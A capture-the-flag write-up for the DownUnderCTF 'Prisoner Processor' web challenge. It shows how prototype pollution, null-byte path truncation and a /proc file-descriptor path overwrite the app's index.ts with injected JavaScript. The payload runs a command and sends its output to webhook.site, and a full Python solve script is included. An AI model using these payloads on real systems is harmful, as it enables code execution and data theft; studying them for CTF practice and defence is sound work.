---
created: 2024-07-07T02:38
updated: 2024-07-07T03:57
title: Prisoner Processor
---

## Analysis

```ts [index.ts]
const getSignedData = (data: any): any => {
  const signedParams: any = {};
  for (const param in data) {
    if (param.startsWith(SIGNED_PREFIX)) {
      const keyName = param.slice(SIGNED_PREFIX.length);
      signedParams[keyName] = data[param];
    }
  }
  return signedParams;
};
```

- This is vulnerable to prototype pollution.
- Only parameters starting with `signed.` are checked for signature.

```ts
const outputPrefix = z.string().parse(signedData.outputPrefix ?? "prisoner");
const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
```

- `outputPrefix` is not defined anywhere, it is our target for pollution.

```ts
const json = JSON.parse(readFileSync(fullPath).toString());
prisoners.push({
  data: json,
  signature: getSignature(getSignedData(json))
});
```

- We can use the examples to build our payload upon.

```sh
#!/bin/bash

cd /app;
# Loop in case the app crashes for some reason ¯\_(ツ)_/¯
while :; do
    for i in $(seq 1 5); do
        bun run start;
        sleep 1;
    done
    # Okay for some reason something really goofed up...
    # Restoring from backup
    cp -r /home/bun/backup/app/* /app;
done
```

- This is inviting a crush.
## Attack

### Custom File Name

By polluting `outputPrefix` we can change the output file.

```python
d['data']['signed.__proto__'] = {
    "outputPrefix": "hewwo\u0000"
}
# {"msg":"hewwo\u0000-5595316e6c23eddd.yaml"}
```

It worked, use null terminator to end the file path prematurely to get rid of the suffix.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1720335471/2024/07/a83e996f9b627e9eb808b892a746556f.png)

### Overwrite index.ts

```ts
const BANNED_STRINGS = [
  "app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"
];
```

Everything is great but how do we escape the blacklist?

> My teammate @spipm, was the one who came up with the exact execution of the bypass..
> I got stuck playing with path traversal.

```python
d['data']['signed.__proto__'] = {
    "outputPrefix": "../../proc/9/fd/3\u0000"
}
```

You can find `/proc` targets via the following command.

```sh
$ find /proc -type l -ls | grep index.ts
find: '/proc/tty/driver': Permission denied
   5107188      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/9/fd/3 -> /app/src/index.ts
   5090100      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/18/fd/3 -> /app/src/index.ts
   5090164      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/19/fd/3 -> /app/src/index.ts
   5090228      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/20/fd/3 -> /app/src/index.ts
   5090292      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/21/fd/3 -> /app/src/index.ts
   5106740      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/22/fd/3 -> /app/src/index.ts
   5106804      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/23/fd/3 -> /app/src/index.ts
   5106868      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/24/fd/3 -> /app/src/index.ts
   5106932      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/26/fd/3 -> /app/src/index.ts
   5106996      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/28/fd/3 -> /app/src/index.ts
   5107060      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/30/fd/3 -> /app/src/index.ts
   5107124      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/task/31/fd/3 -> /app/src/index.ts
   5106453      0 lr-x------   1 bun      bun            64 Jul  7 07:23 /proc/9/fd/3 -> /app/src/index.ts
find: '/proc/91/task/91/fd/5': No such file or directory
find: '/proc/91/fd/6': No such file or directory
```

### Payload

```python
{
    'fetch("https://webhook.site?w=" + (await require("bun").$`/bin/getflag`.text()));/*': "",
    'signed.name': 'jeff',
    'signed.animalType': 'emu',
    'signed.age': 12,
    'signed.crime': 'assault',
    'signed.description': 'clotheslined someone with their neck',
    'signed.start': '2024-03-02T10:45:01Z',
    'signed.release': '2054-03-02T10:45:01Z',
    'signed.__proto__': {
        "outputPrefix": "../../proc/9/fd/3\u0000"
    },
    "payload": "*///"
}
```

- We replace `index.ts` with our generated yml file.
- For our yml to run as js, we use block comments to comment out everything in-between and the last quote.
- Send the flag to our webhook.
- Crash the script so it will be restarted by `start.sh`.

## Solve Script

```python
import requests
s = requests.Session()
target = "https://web-prisoner-processor-3bdc15af869668aa.2024.ductf.dev"
# target = "http://localhost:1337"
d = s.get(f"{target}/examples")
sign = d.json()['examples'][0]['signature']

d = {'data': {
    'fetch("https://webhook.site?w=" + (await require("bun").$`/bin/getflag`.text()));/*': "",
    'signed.name': 'jeff',
    'signed.animalType': 'emu',
    'signed.age': 12,
    'signed.crime': 'assault',
    'signed.description': 'clotheslined someone with their neck',
    'signed.start': '2024-03-02T10:45:01Z',
    'signed.release': '2054-03-02T10:45:01Z',
    'signed.__proto__': {
        "outputPrefix": "../../proc/9/fd/3\u0000"
    },
    "payload": "*///"
}, 'signature': sign}

r = s.post(f"{target}/convert-to-yaml", json=d)
print(r.text)
d['data']['signed.__proto__']['outputPrefix'] = "../../../ap\\p/sr\\c/owo-crusher-owo\u0000"
r = s.post(f"{target}/convert-to-yaml", json=d)
print(r.text)
# {"msg":"../../proc/9/fd/3\u0000-f8af8a2374745bb5.yaml"}
# {"msg":"../../../ap\\p/sr\\c/owo-crusher-owo\u0000-afead8be95834c3e.yaml"}

# DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}
```

Again, thanks to my teammate @spipm.
The above solve script is heavily inspired by his.
The halting payload was by my own findings though, (you can probably guess why).
